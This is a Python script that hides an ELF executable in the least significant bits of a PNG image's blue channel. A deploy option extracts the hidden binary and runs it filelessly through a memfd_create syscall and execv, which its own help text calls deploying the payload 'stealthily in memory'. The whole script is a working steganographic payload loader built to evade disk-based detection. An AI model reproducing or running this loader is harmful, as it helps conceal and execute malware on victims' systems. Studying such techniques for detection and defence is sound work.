#!/usr/bin/env python3

import os
import sys
import argparse
import binascii
import random
import time
import ctypes
import ctypes.util
from pathlib import Path
from PIL import Image
from bitstring import BitArray
from bitstring import ConstBitStream

# Create command line options (-c,-d,-i,-p,-o) with argparse module:
parser = argparse.ArgumentParser()
parser.add_argument("-c", "--conceal", action="store_true", help="conceal ELF file in image; use with -i, -p, -o.")
parser.add_argument("-d", "--deploy", action="store_true", help="decode ELF file from image and deploy payload stealthily in memory; use with -i." )
parser.add_argument("-i", "--image", type=Path, help="image input required as argument.", metavar='<image file>' )
parser.add_argument("-p", "--payload", type=Path, help="elf executable file required as argument.", metavar='<elf file>' )
parser.add_argument("-o", "--output", type=str, help="save your output file in PNG format.", metavar='<output file name.png>' )

args = parser.parse_args()

conceal = args.conceal
deploy = args.deploy
image_input = args.image
payload = args.payload
output_file = args.output

file_in = payload
image_in = image_input
output_name = output_file
    

# Conceal ELF file inside an image:
def Hide():

    # file_in = 'xeyes' #Payload script
    # image_in = 'burger2.png' #Carrier image

    def bitPadder(data, image):
        '''
        Function to pad the bitstream so that it's
        the same size as the number of pixels in the
        carrier image
        '''
        padded_list = []
        for index in range(image.size[0] * image.size[1]):
            if index < len(data):
                padded_list.append(data[index])
                #If index refers to a bit in the bitstream, add it
            else:
                padded_list.append(random.randint(0,1))
                #If the index has exceeded the size of the bitstream,
                #insert a random bit
        return padded_list

    size = os.path.getsize(file_in)
    bitsize = size * 8

    fh = open(file_in, 'rb')
    binary = fh.read()

    s = ConstBitStream(binary)
    bits = s.read(f'bin:{bitsize}')

    im = Image.open(image_in)
    imagecopy = im.copy()

    bitlist = list(bits)
    #list of 0's and 1's as strings

    #Append delimiter of 256 1's to bitlist
    for i in range(256):
        bitlist.append(1)
    # print(len(bitlist))

    padded_list = bitPadder(bitlist, imagecopy)
    #print(len(padded_list))

    #Encode the bitstream into the LSB of the blue channel
    pixels = imagecopy.load()
    rgb_im = imagecopy.convert('RGB')
    for y in range(imagecopy.size[1]):
        for x in range(imagecopy.size[0]):
            # if (y * image.size[0] + x) > len(file_bits):
            # return image
            r, g, b = rgb_im.getpixel((x, y))
            b_zero = (b & 0xFE)  # Sets LSB to zero
            new_bit = int(padded_list[(y * imagecopy.size[0]) + x])
            pixels[x, y] = (r, g, b_zero ^ new_bit)

    #Show the steganographic image, then save it
    imagecopy.show()
    imagecopy.save(output_name)

# When command line option -c is used:
if conceal:
    Hide()

#=========================================================

# Extract ELF file and execute: 
def Deploy():
    im = Image.open(image_in)
    newimage2 = im.copy()
    rgb_ni = newimage2.convert('RGB')

    #For each pixel, zero out the LSB in the red channel
    pixels = newimage2.load()
    msg_list = []
    for y in range(newimage2.size[1]):
        for x in range(newimage2.size[0]):
            r, g, b = rgb_ni.getpixel((x,y))
            #print(f'R: {r}, G: {g}, B: {b}')
            LSB = str(b & 1)
            #print(f'LSB: {LSB}')
            msg_list.append(LSB)

    #print(len(msg_list))
    message = ''
    output = ''.join(msg_list)
    delimiter = 256 * '1'
    d_index = output.find(delimiter)
    output = output[:d_index]

    #print(output)

    hex_chars = hex(int(output, 2))
    #print(hex_chars)

    # Use the hex string to get the bytes - ignore the '0x' characters
    # at the beginning of the hex string
    file_bytes = binascii.a2b_hex(hex_chars[2:])

    #print(file_bytes)

    # Write the file using the bytes
    libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))
    fd = libc.syscall(319,b'Mitsurugi', 1)
    assert fd >= 0

    f1 = file_bytes
    f2 = open('/proc/self/fd/'+str(fd), mode='wb')
    print('files opened')
    #print(type(binary), binary[:50])

    f2.write(f1)
    print('file written')
    #f1.close()
    f2.close()
    #print('file closed')

    # time.sleep(50)
    os.execv('/proc/self/fd/'+str(fd), ['test'])

# When command line option -d is used:
if deploy:
    Deploy()
